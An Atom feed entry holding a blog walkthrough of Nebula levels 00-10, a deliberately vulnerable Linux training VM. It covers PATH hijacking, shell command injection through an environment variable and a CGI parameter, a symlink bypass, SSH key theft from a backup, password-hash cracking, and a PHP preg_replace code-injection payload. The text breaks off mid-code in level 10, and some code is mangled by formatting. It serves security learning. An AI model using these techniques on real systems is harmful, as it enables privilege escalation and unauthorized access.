<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploit | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-24T07:23:56-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula levels 00-10]]></title>
    <link href="http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/"/>
    <updated>2016-01-09T09:50:44-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>  SUID files</li>
<li>  Permissions</li>
<li>  Race conditions</li>
<li>  Shell meta-variables</li>
<li>  $PATH weaknesses</li>
<li>  Scripting language weaknesses</li>
<li>  Binary compilation failures</li>
</ul>


<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<p>I am doing these levels by SSH'ing into the box, rather than directly in the Nebula terminal.</p>

<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>

<!-- more -->


<h3>Level00</h3>

<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>

<p>To access this level, log in as level00 with the password of level00.</p>

<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>

<p><code>plain
Congrats, now run getflag to get your flag!
</code></p>

<p>Run getflag and level complete:</p>

<p><code>plain
You have successfully executed getflag on a target account
</code></p>

<h3>Level01</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  system(&ldquo;/usr/bin/env echo and now what?&rdquo;);
}
```</p>

<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>

<p>First, let&rsquo;s see our current path:</p>

<p><code>plain
level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</code></p>

<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>

<p><code>plain
level01@nebula:~$ PATH=/tmp:$PATH
level01@nebula:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</code></p>

<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>

<p><code>plain
level01@nebula:/tmp$ cat echo
/bin/getflag
</code></p>

<p>Now go back and run the <em>flag01</em> binary:</p>

<p><code>plain
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
</code></p>

<h3>Level02</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char *buffer;</p>

<p>  gid_t gid;
  uid_t uid;</p>

<p>  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  buffer = NULL;</p>

<p>  asprintf(&amp;buffer, &ldquo;/bin/echo %s is cool&rdquo;, getenv(&ldquo;USER&rdquo;));
  printf(&ldquo;about to call system(\&rdquo;%s\&ldquo;)\n&rdquo;, buffer);</p>

<p>  system(buffer);
}
```</p>

<p>Running this program outputs the following:</p>

<p><code>plain
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
</code></p>

<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>

<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
libraries  to  avoid vulnerabilities that could occur if set-user-ID or
set-group-ID programs accidentally trusted the environment.</p></blockquote>

<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>

<p><code>plain
level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
level02@nebula:/home/flag02$ echo $USER
pwned;/bin/getflag;
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo pwned;/bin/getflag; is cool")
pwned
You have successfully executed getflag on a target account
sh: is: command not found
</code></p>

<p>So why did this work? Remember this line:</p>

<p><code>c
asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER"));
</code></p>

<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>

<h3>Level03</h3>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<p>So we have a shell script and a directory:</p>

<p>``` plain
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
level03@nebula:/home/flag03$ cat writable.sh</p>

<h1>!/bin/sh</h1>

<p>for i in /home/flag03/writable.d/* ; do</p>

<pre><code>(ulimit -t 5; bash -x "$i")
rm -f "$i"
</code></pre>

<p>done</p>

<p>```</p>

<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>

<p><code>plain
level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh
/bin/getflag &gt; /tmp/readme
</code></p>

<p>Now wait a bit and check the output:</p>

<p><code>plain
level03@nebula:/tmp$ cat readme
You have successfully executed getflag on a target account
</code></p>

<h3>Level04</h3>

<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>

<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char buf[1024];
  int fd, rc;</p>

<p>  if(argc == 1) {</p>

<pre><code>  printf("%s [file to read]\n", argv[0]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  if(strstr(argv[1], &ldquo;token&rdquo;) != NULL) {</p>

<pre><code>  printf("You may not access '%s'\n", argv[1]);
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to open %s", argv[1]);
</code></pre>

<p>  }</p>

<p>  rc = read(fd, buf, sizeof(buf));</p>

<p>  if(rc == -1) {</p>

<pre><code>  err(EXIT_FAILURE, "Unable to read fd %d", fd);
</code></pre>

<p>  }</p>

<p>  write(1, buf, rc);
}
```</p>

<p>Right, so our goal is to read the token file:</p>

<p><code>plain
level04@nebula:/home/flag04$ ls
flag04  token
</code></p>

<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>

<p><code>plain
level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
level04@nebula:/tmp$ ls -l readthis
lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token
</code></p>

<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>

<p><code>plain
level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
06508b5e-8909-4f38-b630-fdb148a848a2
</code></p>

<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>

<p><code>plain
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
</code></p>

<h3>Level05</h3>

<p>Check the flag05 home directory. You are looking for weak directory permissions</p>

<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>

<p>Taking a look in the flag05 directory:</p>

<p><code>plain
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
</code></p>

<p>Ok, the <em>.backup</em> folder seems interesting, let&rsquo;s see what&rsquo;s in there:</p>

<p><code>plain
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz
.ssh/
tar: .ssh: Cannot mkdir: Permission denied
.ssh/id_rsa.pub
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
.ssh/id_rsa
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/id_rsa: Cannot open: No such file or directory
.ssh/authorized_keys
tar: .ssh: Cannot mkdir: Permission denied
tar: .ssh/authorized_keys: Cannot open: No such file or directory
tar: Exiting with failure status due to previous errors
</code></p>

<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>

<p><code>plain
level05@nebula:/tmp$ ls -l /home/flag05/.backup/
total 2
-rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz
</code></p>

<p>Not a problem though! We can just move the archive to a directory where we have more freedom:</p>

<p><code>plain
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/
level05@nebula:/tmp$ tar vzxf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
</code></p>

<p>And now with flag05&rsquo;s private key, we can SSH to the machine and run <em>getflag</em>:</p>

<p>``` plain
level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level06</h3>

<p>The flag06 account credentials came from a legacy unix system.</p>

<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>

<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>

<p><code>plain
level06@nebula:/home/flag06$ cat /etc/passwd
...
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
...
</code></p>

<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>

<p>``` plain
root@kali:~/Desktop# john &mdash;show hash
?:hello</p>

<p>1 password hash cracked, 0 left
```</p>

<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh'ing and getting the flag:</p>

<p>``` plain
level06@nebula:/home/flag06$ ssh flag06@localhost
The authenticity of host &lsquo;localhost (127.0.0.1)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;localhost&rsquo; (ECDSA) to the list of known hosts.</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>flag06@localhost&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level 07</h3>

<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>

<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>

<p>``` perl</p>

<h1>!/usr/bin/perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub ping {
  $host = $_[0];</p>

<p>  print(&ldquo;<html><head><title>Ping results</title></head><body><pre>&rdquo;);</p>

<p>  @output = <code>ping -c 3 $host 2&gt;&amp;1</code>;
  foreach $line (@output) { print &ldquo;$line&rdquo;; }</p>

<p>  print(&ldquo;</pre></body></html>&rdquo;);</p>

<p>}</p>

<h1>check if Host set. if not, display normal page, etc</h1>

<p>ping(param(&ldquo;Host&rdquo;));
```</p>

<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>

<p>``` plain
&hellip;</p>

<h1>Specifies an alternate port number to listen on.</h1>

<p>port=7007</p>

<h1>Specifies what user to switch to after initialization when started as root.</h1>

<p>user=flag07
&hellip;
```</p>

<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>

<p>``` plain
Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]</p>

<pre><code>        [-p pattern] [-s packetsize] [-t ttl] [-I interface]
        [-M pmtudisc-hint] [-m mark] [-S sndbuf]
        [-T tstamp-options] [-Q tos] [hop1 ...] destination
</code></pre>

<p>```</p>

<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>

<p>``` plain
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.025 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.028 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.034 ms</p>

<p>&mdash;&ndash; localhost ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.025/0.029/0.034/0.003 ms
```</p>

<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>

<p>``` plain
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.036 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.045 ms</p>

<p>&mdash;&ndash; localhost ping statistics &mdash;&ndash;
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.017/0.032/0.045/0.013 ms
You have successfully executed getflag on a target account
```</p>

<h3>Level 08</h3>

<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>

<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>

<p><img class="center" src="/images/nebula/level8.png" title="&lsquo;level8&rsquo; &lsquo;level8&rsquo;" ></p>

<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH'ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>

<p><img class="center" src="/images/nebula/level8hex.png" title="&lsquo;level8hex&rsquo; &lsquo;level8hex&rsquo;" ></p>

<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>

<ul>
<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
</ul>


<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>

<p>``` plain
level08@nebula:/home/flag08$ ssh flag08@localhost</p>

<pre><code>  _   __     __          __     
 / | / /__  / /_  __  __/ /___ _
/  |/ / _ \/ __ \/ / / / / __ `/
</code></pre>

<p>   / /|  /  <strong>/ /<em>/ / /</em>/ / / /<em>/ /
  /</em>/ |_/_</strong>/<em>.</em><em><em>/_</em>,</em>/<em>/_</em>,_/</p>

<pre><code>exploit-exercises.com/nebula
</code></pre>

<p>For level descriptions, please see the above URL.</p>

<p>To log in, use the username of &ldquo;levelXX&rdquo; and password &ldquo;levelXX&rdquo;, where
XX is the level number.</p>

<p>Currently there are 20 levels (00 &ndash; 19).</p>

<p>flag08@localhost&rsquo;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a>
New release &lsquo;12.04 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</li>
</ul>


<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h3>Level 09</h3>

<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>

<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>

<p>``` php
&lt;?php</p>

<p>function spam($email)
{
  $email = preg_replace(&ldquo;/./&rdquo;, &ldquo; dot &rdquo;, $email);
  $email = preg_replace(&ldquo;/@/&rdquo;, &ldquo; AT &rdquo;, $email);</p>

<p>  return $email;
}</p>

<p>function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);</p>

<p>  $contents = preg_replace(&ldquo;/([email (.*)])/e&rdquo;, &ldquo;spam(\&rdquo;\2\&ldquo;)&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/[/&rdquo;, &ldquo;&lt;&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/]/&rdquo;, &ldquo;>&rdquo;, $contents);</p>

<p>  return $contents;
}</p>

<p>$output = markup($argv[1], $argv[2]);</p>

<p>print $output;</p>

<p>?>
```</p>

<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>

<ul>
<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
</ul>


<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>

<ul>
<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
</ul>


<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>

<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
be escaped by backslashes in substituted backreferences.</p></blockquote>

<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>

<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>

<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>

<p><code>plain
level09@nebula:/home/flag09$ ./flag09 /tmp/test
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
nothing to see here
</code></p>

<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>

<p>First of all, the line that facilitates the exploitation is:</p>

<p><code>php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
</code></p>

<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>

<p><code>plain
haxor@hack.com becomes haxor AT hack dot com
</code></p>

<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>

<p><code>plain
[email haxor@hack.com]
</code></p>

<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>

<p>``` plain</p>

<h1>{${eval($_GET[php_code])}}</h1>


<p>```</p>

<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>

<p><code>plain
{${eval()}}
</code></p>

<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>

<p><code>plain
[email {${system()}}]
</code></p>

<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>

<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>

<ul>
<li><p>we want to run <em>getflag</em></p></li>
<li><p>we can run external commands in PHP with <em>system()</em></p></li>
<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
<li><p>we have to put the exploit into a file to be read by the binary</p></li>
</ul>


<p>With all these requirements in mind, I created a file with the exploit:</p>

<p><code>plain
level09@nebula:/home/flag09$ cat /tmp/useme
[email {${system($use_me)}}]
</code></p>

<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>

<p><code>plain
level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
</code></p>

<p>Pff, this was a difficult level, but really interesting and I learned something!</p>

<h3>Level 10</h3>

<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>

<p>To do this level, log in as the level10 account with the password level10 . Files for this level can be found in /home/flag10.</p>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
 char </em>file;
 char </em>host;</p>

<p> if(argc &lt; 3) {
  printf(&ldquo;%s file host\n\tsends file to host if you have access to it\n&rdquo;, argv[0]);
  exit(1);
 }</p>

<p> file = argv[1];
 host = argv[2];</p>

<p> if(access(argv[1], R_OK) == 0) {
  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];</p>

<p>  printf(&ldquo;Connecting to %s:18211 .. &rdquo;, host); fflush(stdout);</p>

<p>  fd = socket(AF_INET, SOCK_STREAM, 0);</p>

<p>  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);</p>

<p>  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
   printf(&ldquo;Unable to connect to host %s\n&rdquo;, host);
   exit(EXIT_FAILURE);
  }</p>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<p>  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
